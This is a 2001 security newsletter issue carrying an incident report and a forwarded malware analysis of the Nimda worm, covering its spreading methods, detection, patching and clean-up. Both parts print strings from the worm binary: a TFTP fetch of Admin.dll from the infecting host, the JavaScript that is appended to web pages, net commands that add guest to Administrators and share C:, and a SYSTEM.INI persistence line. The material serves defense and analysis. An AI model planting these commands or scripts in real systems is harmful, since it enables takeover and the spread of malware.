The NIMDA worm is spreading faster than Code Red, appears to have at
least four distinct propagation mechanisms, and infects hosts running
most versions of Windows. In other words it is a far more vicious worm
than Code Red. The network activity caused by the worm has resulted
in effective denial of service attacks at many sites. I've included
this morning's complete report from Incidents.org at the end of this
Newsbites issue. Updates to the report can be found at

Nimda Worm
Version 0.2 - September 19, 2001
NIMDA Worm/Virus Report -- Preliminary

Last Update: September 19, 2001 6:00 AM CDT
SUMMARY: A new worm that has been named "Nimda" is propagating with
unprecedented speed across the Internet. The worm appears to have at
least four distinct propagation mechanisms, and infects hosts running
any version of Windows. The network activity caused by the worm
has resulted in an effective denial of service attack at many sites.
The worm was named NIMDA (admin spelled backwards) in part because the
name "Concept Virus" conflicts with another virus from a few years ago.

SURGE IN HTTP TRAFFIC: On Sept. 18th incidents.org and its partner
organization DShield.org received a huge number of reports of increased
HTTP probing and network slowdowns.  The plots below show the surge
in both the number of HTTP probes (Figure 1) and the number of unique
sources generating the probes (Figure 2). Further, the activity jumped
dramatically at approximately 13:00 GMT and then proceeded to taper off
in the following hours. Figure 3 shows the number of probes received
per hour on Sept. 18th, and Figure 4 shows the hourly breakdown for
number of unique sources generating the activity on the same day.

DISTRIBUTION OF SCANNING HOSTS: The 86,000+ unique IP addresses
reported to the Internet Storm Center as sourcing port 80 probes on
the 18th breaks down by country roughly as follows (only countries
contributing > 500 sources are shown):

Country	# Ips	% of Total
USA 	37318 	42.97 %
China 	7818 	9.00 %

OVERVIEW OF WORM PROPAGATION: Preliminary analyses indicate that the
worm attempts to propagate itself to new victims via four distinct
mechanisms.

1.	The worm scans the Internet looking for IIS servers and
attempts to exploit a number of IIS vulnerabilities to gain control
of a victim host.  Network attacks include exploitation of the "IIS
Directory Traversal Vulnerability", and utilization of backdoors
left behind by previous Code Red II and Sadmind infections. Once in
control of a victim IIS server, the worm uses TFTP to transfer its
code from the attacking machine to the victim. The file transferred
via TFTP is named Admin.dll.

2.	The worm harvests email addresses from the Windows address
book and user's inboxes and sends itself to all addresses as an
attachment named "readme.exe".	Note that any x86 email software that
uses Internet Explorer 5.5 SP1 or earlier to display HTML messages
will automatically execute the malicious attachment if the message is
merely opened or previewed. This happens because the worm MIME encodes
the attachment to take advantage of a known vulnerability called
"Automatic Execution of Embedded MIME Types" (see CERT advisory
CA-2001-06). Microsoft's Outlook and Outlook Express are the most
typical victims.

3.	If the worm successfully infects a web server, it uses
the HTTP service to propagate itself to clients who browse the web
server's pages. Upon infecting a victim server, the worm creates a
copy of itself named "readme.eml" and traverses the directory tree
(including network shares) searching for web-related files such as
those with .html, .htm, or .asp extensions. Each time the worm finds
a web content file, it appends a piece of JavaScript to the file.
The JavaScript forces a download of readme.eml to any client that
views the file via a browser. Some versions of Internet Explorer
will automatically execute the readme.eml file and allow the worm
to infect the client. The IE vulnerability issue here is the same as
in the email propagation mechanism; that is, IE 5.5 SP1 or earlier is
vulnerable to the "Automatic Execution of Embedded MIME Types" problem.
Allowing JavaScript in the browser enables the attack to take advantage
of the vulnerability.

4.	The worm is network aware and propagates via open file
shares. It will copy itself to all directories, including those found
on a network share, for which the user has write permission. These
worm copies are named "readme.eml". Any other host that accesses the
share and executes or previews one of these files can become infected.

TARGETING MECHANISM: The IIS propagation mechanism described
above requires an infected system to scan the Internet in search of
vulnerable IIS servers. This worm prefers to target its neighbors in
IP space and will only attack a completely random target IP with a 25%
probability. The worm chooses targets having the same first octet
(only) with 25% probability, and having the same first two octets
with 50% probability. This behavior can lead to massive amounts of
network activity at sites having several infected machines.

Note: Some conflicting reports indicate that the worm first targets
IPs with the same first three octets, then moves to IPs with the
same first two octets, and then out a level further to IPs with the
same first octet. The exact target selection pattern is still under
investigation, but it is clear that the worm prefers to target locally
rather than randomly.

DETAILS OF IIS PROPAGATION: A short example of the IIS probes launched
by the worm is shown below. These logs were captured by an Apache web
server. Note that the pattern repeats itself; some reports indicate
that the 16-probe sequence will be repeated against a single target
as many as 13 times. Note that the first two attacks show the worm
attempting to exploit the root.exe backdoor left by Code Red II or
possibly Sadmind infections. The next set of two attacks are also
targeting Code Red II backdoors where the root C: and D: drives are
mapped to IIS virtual folders, allowing access to cmd.exe.

Once the worm gains access to a vulnerable IIS webserver, it uses
tftp to fetch a binary called Admin.dll from the infecting host. The
following string is embedded in the worm executable:
tftp%%20-i%%20%s%%20GET%%20Admin.dll%%20
An example packet capture of the tftp request is shown below.

74 00                                            t.

DETAILS OF EMAIL PROPAGATION: The worm sends itself to email addresses
found in the inbox and the address book as an attachment called
readme.exe.  The attachment is actually encoded as a MIME "multipart-
alternative" message with two sections. The first section is defined
as MIME type "text/html", and the second section is defined as MIME
type "audio/x-wav". The second section actually contains the malicious
executable file.  The MIME headers for the email message are reproduced
below. These strings are actually embedded in the worm executable.

- -------------------------------------------

The emails sent by the worm are easily recognizable because very long
repetitive subject lines are used. An example of one such subject
line is shown below. Also, the email attachment sent by the worm
is consistently 57344 bytes long, although MD5 checksums of the
attachments may vary.
Subject:
O•^Rdesktopdesktopsamplesampledesktopsampledesktopsamplesampledesktop
desktopdesktopdesktopsampledesktopdesktopsampledesktopdesktopdesktop
sampledesktopdesktopsampledesktopsampledesktopsampledesktopsampl
Note: Emails carrying the readme.exe attachment have often been
found with spoofed souce addresses. The addresses appear to have
been chosen such that they will inspire the recipient to trust the
email. Spoofed sources observed to date are: piracy@microsoft.com,
codered@sans.org, webmaster@incidents.org, asportal@microsoft.com,
and various attrition.org addresses.

DETAILS OF WEB BROWSER-BASED PROPAGATION: A client browsing the web
pages served by an infected website may become infected. Recall that
each web-related page is contaminated with a bit of JavaScript code
during the infection. When the JavaScript is activated by a client's
browser, the script attempts to download the worm to the client
in the form of a file named readme.eml". If the client is running
a vulnerable version of Internet Explorer, the worm code will be
automatically executed.  The snippet of JavaScript that is appended
to each web page is:
<html><script language="JavaScript">window.open("readme.eml", null,
"resizable=no,top=6000,left=6000")</script></html>

DETAILS OF FILE SHARE ISSUES: In addition to copying itself to all
directories, including those on shared network drives, the worm
actively sets up file sharing on the victim. The worm appears to
make every directory available as a share, and makes the "Guest"
user an active member of the Administrators group. By default the
Guest account has no password on Windows systems.  Related strings
from the worm executable are:
share c$=c:\
user guest ""
localgroup Administrators guest /add
localgroup Guests guest /add
user guest /active
user guest /add
net%%20use%%20\\%s\ipc$%%20""%%20/user:"guest"

CHANGES TO THE VICTIM FILESYSTEM: The worm infects numerous binaries
on a victim system, such that any time one of the infected executables
is run the worm is launched. In addition, the worm positions itself
in such a way that when document files are opened in editors the worm
code is executed (see [3]). These characteristics make it incredibly
difficult to clean the worm from an infected system.
The worm also makes numerous changes to the victim's registry. Affected
keys include (these are assumed to be relative to HKLM):
System\CurrentControlSet\Services\VxD\MSTCP
SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security
Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
software\microsoft\windows nt\currentversion\perflib\009
software\microsoft\windows nt\currentversion\perflib
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\X$
SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\
SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan
SYSTEM\CurrentControlSet\Services\lanmanserver\Shares
Software\Microsoft\Windows\CurrentVersion\Explorer\MapMail
Regsistry manipulation commands include:
RegCloseKey
RegQueryValueExA
RegOpenKeyExA
RegEnumKeyExA
RegCreateKeyExA
RegDeleteKeyA
RegEnumValueA
RegSetValueExA
RegQueryValueA

RESOURCE CONSUMPTION: The worm appears to launch numerous threads for
scanning the network which can place considerable load on the infected
machine as well as the network. Strings in the worm binary indicate
that the worm may be performing some sort of resource monitoring tasks.
Relevant strings:
CreateThread
SetThreadPriority
GetCurrentThread
CreateRemoteThread
% User Time
% Privileged Time
% Processor Time

ISSUES UNDER INVESTIGATION: Some reports indicate that the worm
may actually cause hardware damage to victim machines.  This claim
is currently unverified. The worm executable contains a call
to GetSystemTime. It is currently unknown exactly what the worm
uses the time for. Some unconfirmed reports indicate that the worm
includes mechanisms to change its behavior at a later date. However,
the worm does not appear to carry any sort of DDoS-type payload. Most
reports on this topic say that the time is used in the generation of
a random value.

DETECTION:
Network intrusion detection systems can be configured to trigger on a
number of network events initiated by the worm. HTTP packets containing
the string "readme.eml", or TFTP packets containing "Admin.dll" are
good triggers.  Further, filters can be written to detect the specific
backdoor and directory traversal attacks targeting IIS servers.

Host-based intrusion detection systems can be configured to notice the
changes to system executables, and the presence of the "readme.eml"
files throughout the filesystem. The offending piece of JavaScript
appended to web content files is another good signature of infection
on web servers.  Nessus has made a plug-in available for its scanner
that will remotely test a web server for infection by checking for
the tell-tale JavaScript addtion to web pages.  Email filters can be
configured to screen for emails carrying attachments named "readme.exe"
and having long (80 characters or more) subject lines.

PROTECTION:
IIS servers should be kept up to date with all current patches. This
worm takes advantage of vulnerabilities that are eliminated by
Microsoft's cumulative IIS patch available from:

http://www.microsoft.com/technet/security/bulletin/MS01-020.asp

Note however, that the IIS cumulative patch does not clean out any
backdoors created by Code Red II or Sadmind infections. Administrators
should look for the file root.exe and check to see if their C:
or D: drives have been mapped to IIS virtual folders named "c"
and "d". This is important since a recent Netcraft survey showed
that many patched IIS servers still have the root.exe backdoor.
(See http://www.netcraft.com/survey for August 2001.)  Internet
Explorer users should be careful to use a version of the browser that
is secured against the "Automatic Execution of Embedded MIME Types"
vulnerability. IE 5.01 requires a patch available here:
http://www.microsoft.com/technet/security/bulletin/MS01-020.asp
Microsoft recommends upgrading to IE 5.5 SP2 or IE 6.0 to avoid
problems.
Disabling JavaScript will prevent the worm code from being executed
by a browser upon encountering an infected webserver that attempts
to download readme.eml.
It is important that the readme.exe file which arrives as an email
attachment not be executed.

CLEAN-UP: Any system that has been infected with this worm will be
difficult to clean due to how the worm copies itself all over the
directory tree and trojans numerous binaries. The recommended response
is to disconnect the system from the network, reformat the hard drive,
reinstall the system software, install any necessary security patches,
and then reconnect the system to the network. No other reliable means
of cleaning the worm is currently known to exist. However, we expect
more information in this area will be forthcoming.

Subject: Very Very good explanation of Concept/Nimda worm propagation

Nimda is a complex mass-mailer, network worm and virus. It is a 57kb
PE DLL file with an EXE extension.

When run the worm first checks the name of the file it was run from. If
the name of worm's file is ADMIN.DLL, the worm creates a mutex with
'fsdhqherwqi2001' name, copies itself as MMC.EXE into \Windows\
directory and starts this file with '-qusery9bnow' command line. If
the worm is started from README.EXE file (or a file that has more
than 5 symbols in its name and EXE extension) the worm copies itself
to temporary folder with a random name and runs itself there with
'-dontrunold' command line option.

If the worm is run for the first time (as README.EXE) it loads itself
as a library, looks for some resource there and checks its size. If
the resource size is less than 100, the worm unloads itself, otherwise
the worm checks if it was launched from a hard drive and deletes its
file in case it was launched from other type of media. If the worm's
file that is delete is locked, the worm creates WININIT.INI file that
will delete the worm's file on next Windows startup. If the worm was
launched from a hard drive, it checks one of its resources, extracts
it to a file and launches it.  Checking the resource size is done to
be able to detect if a worm runs from and infected EXE file. In this
case the original executable part is extracted and run by the worm
to disguise its presence.

Then the worm gets current time and generates a random number. After
performing multiplication and division with this number the worm
checks the result. If a result is bigger than worm's counter, the
worm starts to search and delete README*.EXE files in temporary folder.

The worm tries to create the
[SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
key in the Registry. It also queries 'NameServer' value from
[System\CurrentControlSet\Services\VxD\MSTCP] key. After that the
worm updates its resources and deletes and re-creates its file. If
the file is locked, the worm creates WININIT.INI file that will delete
the previously locked file on next Windows startup.

After that the worm prepares its MIME-encoded copy by extracting a
pre-defined multi-partite message from its body and appending its
MIME-encoded copy to it. The file with a random name is created in
temporary folder.

The worm looks for EXPLORER process, opens it and assigns its
process as remote thread of Explorer. Then the worm gets API creates
a mutex with 'fsdhqherwqi2001' name, startups Winsock services,
gets an infected computer (host) info and sleeps for some time. When
resumed, the worm checks what platform it is running. If it is running
on NT-based system, it compacts its memory blocks to occupy less
space in memory and copies itself as LOAD32.EXE to Windows system
directory. Then it modifies SYSTEM.INI file by adding the following
string after SHELL= variable in [Boot] section:

 explorer.exe load.exe -dontrunold

This will start the worm's copy every time Windows starts. The worm
also copies itself as RICHED32.DLL file to system folder and sets
hidden and system attributes to this file as well as to LOAD.EXE
file. Then the worm enumerates shared network resources and scarts
to recursively scan files on remote systems. If the worm finds an EXE
file on a remote system, it reads the file, deletes it and then writes
a new file where the worm body is placed first and the original EXE
file is present as a resource. Later when this affected file will be
run, the worm will extract the EXE file resource and run it. The worm
checks the file name for 'WinZip32.exe' and doesn't affect this file
if it is found.

When searching for files in remote systems the worm collects names
of DOC files and then copies its file to folders where DOC files are
located with RICHED32.DLL name. The copied file has system and hidden
attributes.  This is done to increase the chances of worm activation
on remote systems as Windows' original RICHED32.DLL component is used
to open OLE files. But instead the worm's RICHED32.DLL file will be
launched as Windows first checks current directory for needed DLLs.

Also when the worm browsing the remote computers' directories it
creates .EML and .NWS (rarely) files that have the names of document
files that the worm could find on a remote system. These .EML and .NWS
files are worm's multi-partite messages with a worm MIME-encoded in
them. When scanning the worm can also delete the .EML and .NWS files
it previously created.

The worm adjusts the properties of Windows Explorer, it accesses
[Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced] key
and adjusts 'Hidden', 'ShowSuperHidden' and 'HideFileExt' keys. This
affects Windows' (especially ME and 2000) ability to show hidden
files - worm's files will not be seen in Explorer any more.

After that the worm adds a 'guest'account to infected
system account list, activates this account, adds it to
'Administrator' and 'Guests' groups and shares C:\ drive with
full access priviledges. The worm also deletes all subkeys from
[SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security]
key to disable sharing security.

The worm accesses[SOFTWARE\Microsoft\Windows\CurrentVersion\App
Paths] key reads subkeys from there and affects all files
listed in the subkeys the same way it does affect remote EXE
files (see above). The worm doesn't only infect WinZip32.exe
file. Also the worm reads user's personal folders from
[Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders]
key and infects files in these folders as well.

Finally the worm starts to search local hard drives for HTML, .ASP,
and .HTM files and also for files with 'DEFAULT', 'INDEX', 'MAIN'
and 'README' words in their filenames and if such files are found,
the worm creates README.EML file (which is the multi-partite message
with MIME-encoded worm) in the same directory and adds a small
JavaScript code to the end of found files. That JavaScript code
would open README.EML file when the infected HTML file is loaded by
a web browser. As a result the MIME-encoded worm will get activated
because of asecurity hole and a system will get infected. It should be
noted that the worm will not always do the above described operation,
it depends on a random number the worm generates prior to this action.

The worm's file runs from a minimized window when downloaded from
an infected webserver. This technique affects users who are browsing
the web with Internet Explorer 5.0 or 5.01.

 E-Mail spreading:

The worm searches trough all the '.htm' and '.html' file in the
Temporary Internet Files folder for e-mail addresses. It reads through
user's inbox and collects the sender addresses. When the address list
is ready it uses it's own SMTP engine to send the infected messages.

 IIS spreading:

The worm uses backdoors on IIS servers such as the one CodeRed II
installs. It scans random IP addresses for these backdoors. When a
host is found to have one, the worm instructs the machine to download
the worm code (Admin.dll) from the host used for scanning. After this
it executes the worm on the target machine this way infecting it.

The worm has a copyright text string that is never displayed:

Concept Virus(CV) V.5, Copyright(C)2001 R.P.China


It should be said that the worm has bugs that cause crashes or
inability to spread itself in certain conditions.
